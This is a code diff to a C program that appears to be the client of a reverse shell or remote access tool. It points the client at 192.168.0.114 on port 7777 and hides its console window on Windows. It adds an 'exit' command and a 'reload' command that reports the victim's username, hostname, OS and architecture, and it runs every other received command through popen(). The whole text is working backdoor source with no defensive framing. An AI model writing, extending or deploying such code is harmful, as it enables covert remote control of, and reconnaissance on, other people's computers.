@@ -1,7 +1,11 @@
 #include "fonction.h"
 
 int main() {
-    const char *ipTarget = "192.168.0.41";
+#ifdef _WIN32
+    FreeConsole();
+#endif
+
+    const char *ipTarget = "192.168.0.114";
     const unsigned int PORT = 7777;
     char buffer_send[8192] = "";
     char command_rcv[8192] = "";
@@ -43,6 +47,22 @@ int main() {
         memset(buffer_send, 0, sizeof(buffer_send));
 
         recv(sock, command_rcv, sizeof(command_rcv), 0);
+
+        if(strcmp(command_rcv, "exit") == 0) {
+            CloseSocket(sock);
+            CloseConnect();
+            return 0;
+        }
+
+        if (strcmp(command_rcv, "reload") == 0) {
+#ifdef _WIN32
+            sprintf(buffer_send, "%s|%s|%s|%s|%s", GetUsername(WINDOWS), GetHostname_WINDOWS(), GetOSVersion_WINDOWS(), "Unknow", GetArchitecture_WINDOWS());
+#elif defined(__unix__)
+            sprintf(buffer_send, "%s|%s|%s %s|%s|%s", GetUsername(UNIX), GetHostname_UNIX(), info.sysname, info.version, info.release, info.machine);
+#endif
+            send(sock, buffer_send, sizeof(buffer_send), 0);
+            continue;
+        }
 
         fp = popen(command_rcv, "r");
         size_t totalRead = 0;
